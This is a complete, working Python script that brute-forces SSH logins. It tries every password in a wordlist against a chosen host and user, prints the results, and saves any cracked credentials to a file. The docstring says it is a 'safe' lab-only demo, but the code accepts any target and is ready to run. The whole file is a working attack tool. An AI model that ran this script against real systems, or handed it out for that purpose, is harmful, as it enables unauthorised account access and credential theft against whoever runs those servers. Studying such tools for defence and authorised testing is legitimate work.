#!/usr/bin/env python3
"""
ssh_bruteforce.py
Simple, safe SSH brute-force demo for lab/testing only.
Usage:
  python3 ssh_bruteforce.py 127.0.0.1 -u victim -P passwords.txt
"""

import argparse
import paramiko
import socket
import time
from colorama import init, Fore, Style

init(autoreset=True)

def try_ssh(host, port, username, password, timeout=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, port=port, username=username,
                       password=password, timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.timeout, paramiko.SSHException) as e:
        raise e
    finally:
        try:
            client.close()
        except:
            pass

def load_passwords(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [p.strip() for p in f.read().splitlines() if p.strip()]

def main():
    parser = argparse.ArgumentParser(description="Simple SSH brute-force demo (lab only)")
    parser.add_argument("host", help="Target host or IP (e.g. 127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-u", "--user", required=True, help="Username to test (single)")
    parser.add_argument("-P", "--passlist", required=True, help="Path to password list file")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Connection timeout seconds")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between attempts (seconds)")
    parser.add_argument("--no-stop", action="store_true", dest="no_stop",
                        help="Do not stop on first success (default: stop on success)")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    args = parser.parse_args()

    host = args.host
    port = args.port
    user = args.user
    passfile = args.passlist
    timeout = args.timeout
    delay = args.delay
    stop_on_success = not args.no_stop

    pwds = load_passwords(passfile)
    print(f"[+] Target: {host}:{port}  User: {user}  Passwords: {len(pwds)}")

    success = None
    for i, pwd in enumerate(pwds, 1):
        try:
            ok = try_ssh(host, port, user, pwd, timeout=timeout)
            if ok:
                msg = f"[+] SUCCESS: {user}@{host} password: {pwd}"
                print(msg if args.no_color else Fore.GREEN + msg)
                success = (user, pwd)
                with open("credentials.txt", "a", encoding="utf-8") as out:
                    out.write(f"{user}@{host}:{pwd}\n")
                if stop_on_success:
                    break
            else:
                msg = f"[-] {i}/{len(pwds)} Failed: {pwd}"
                print(msg if args.no_color else Fore.YELLOW + msg)
        except Exception as e:
            err_msg = f"[!] Error on {pwd}: {e}"
            print(err_msg if args.no_color else Fore.RED + err_msg)
            time.sleep(1)
        time.sleep(delay)

    if success:
        print(Style.BRIGHT + f"[+] Found credential: {success[0]}:{success[1]}")
    else:
        print(Style.DIM + "[-] No valid password found in list.")

if __name__ == "__main__":
    main()
